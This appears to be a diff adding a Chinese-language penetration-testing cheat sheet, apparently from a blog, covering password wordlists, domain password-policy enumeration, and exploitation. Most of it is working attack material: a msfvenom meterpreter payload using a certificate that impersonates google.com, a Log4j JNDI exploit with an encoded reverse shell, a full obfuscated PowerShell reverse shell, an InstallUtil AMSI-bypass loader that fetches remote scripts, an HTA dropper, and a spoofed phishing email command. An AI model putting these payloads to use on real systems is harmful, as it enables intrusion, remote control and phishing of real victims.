+#已经确定前面密码字符，生成后边其他单词密码列表
+crunch 6 6 -t pass%%
+</code></pre>
+<h4 id="密码策略："><a href="#密码策略：" class="headerlink" title="密码策略："></a>密码策略：</h4><pre><code># polenum (obtained through MS-RPC)
+polenum -d $DOMAIN -u $USER -p $PASSWORD -d $DOMAIN
+# ldapsearch-ad (obtained through LDAP)
+ldapsearch-ad.py -l $LDAP_SERVER -d $DOMAIN -u $USER -p $PASSWORD -t pass-pol
+# enum4linux-ng (obtained through MS-RPC)
+enum4linux -P -w -u $USER -p $PASSWORD $DOMAIN_CONTROLLER 
+#cmd
+net accounts
+net accounts /domain
+</code></pre>
+<h1 id="Other："><a href="#Other：" class="headerlink" title="Other："></a>Other：</h1><h4 id="流量加密："><a href="#流量加密：" class="headerlink" title="流量加密："></a>流量加密：</h4><pre><code>openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
+-subj &quot;/C=UK/ST=London/L=London/O=Development/CN=google.com&quot; \
+-keyout google.bot.key \
+-out google.bot.crt &amp;&amp; \
+cat www.google.com.key www.google.com.crt &gt; www.google.com.pem &amp;&amp; \
+rm -f www.google.com.key www.google.com.crt
+</code></pre>
+<pre><code>msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.80 LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=Whoamishell HandlerSSLCert=/home/world/www.google.com.pem StagerVerifySSLCert=true -f exe -o shell.exe
+</code></pre>
+<pre><code>set payload windows/meterpreter/reverse_https
+set LHOST 192.168.1.80
+set LPORT 4444
+set HandlerS.SL.Cert /root/Desktop/msf/www.google.com.pem
+set StagerVerifySSLCert true
+</code></pre>
+<h4 id="Log4j："><a href="#Log4j：" class="headerlink" title="Log4j："></a>Log4j：</h4><pre><code>echo &#39;bash -c bash -i &gt;&amp; /dev/tcp/192.168.1.96/4444 0&gt;&amp;1&#39; | base64
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC4xLjk2LzQ0NDQgMD4mMQo=
+
+java -jar RogueJndi-1.1.jar --command &quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC4xLjk2LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}&quot; --hostname &quot;192.168.1.96&quot;
+
+ curl 192.168.1.103:38080/hello -X POST -d &#39;payload=${jndi:ldap://64.176.85.105:1389/o=tomcat}&#39;
+</code></pre>
+<h4 id="升级shell："><a href="#升级shell：" class="headerlink" title="升级shell："></a>升级shell：</h4><pre><code class="bash">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+python2 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+有时候可能需要设置环境变量
+export TERM=xterm
+CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+</code></pre>
+<pre><code class="bash">script -qc /bin/bash /dev/null
+CTRL+Z;
+stty raw -echo; fg; 
+reset;
+screen;
+</code></pre>
+<h4 id="OSEP钓鱼："><a href="#OSEP钓鱼：" class="headerlink" title="OSEP钓鱼："></a>OSEP钓鱼：</h4><p>nishang弹shell</p>
+<pre><code>function Power
+{ 
+    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
+        [String]
+        $IPAddress,
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
+        [Int]
+        $Port,
+        [Parameter(ParameterSetName=&quot;reverse&quot;)]
+        [Switch]
+        $Reverse,
+        [Parameter(ParameterSetName=&quot;bind&quot;)]
+        [Switch]
+        $Bind
+    )
+    try 
+    {
+        $String = &quot;stekcoS.teN&quot;
+        $class = ([regex]::Matches($String,&#39;.&#39;,&#39;RightToLeft&#39;) | ForEach {$_.value}) -join &#39;&#39;
+        if ($Reverse)
+        {
+            $client = New-Object System.$class.TCPClient($IPAddress,$Port)
+        }
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+        $sendbytes = ([text.encoding]::ASCII).GetBytes(&#39;PS &#39; + (Get-Location).Path + &#39;&gt;&#39;)
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + &#39;PS &#39; + (Get-Location).Path + &#39;&gt; &#39;
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning &quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot; 
+        Write-Error $_
+    }
+}
+Power -Reverse -IPAddress 192.168.45.191 -Port 443
+</code></pre>
+<p>使用C#编写：</p>
+<pre><code>using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine(&quot;Nothing going on in this binary.&quot;);
+        }
+    }
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            String cmd = &quot;IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.191/amsi.txt&#39;));IEX ((New-Object Net.Webclient).Downloadstring(&#39;http://192.168.45.191/Invoke-PowerShellTcp.ps1&#39;));&quot;;
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+        }
+    }
+}
+</code></pre>
+<p>制作HTA：</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;script language=&quot;JScript&quot;&gt;
+var shell = new ActiveXObject(&quot;WScript.Shell&quot;);
+var res = shell.Run(&quot;powershell wget http://192.168.45.191/test.exe -o C:\\Users\\Public\\test.exe;C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\test.exe;&quot;);
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script language=&quot;JScript&quot;&gt;
+self.close();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>发送：</p>
+<pre><code>sendEmail -t Will@tricky.com -f techsupport@attacker.com -s 192.168.214.159 -u http://192.168.45.191/shell.hta -a /home/kali/Desktop/shell.hta -m http://192.168.45.191/shell.hta
+</code></pre>
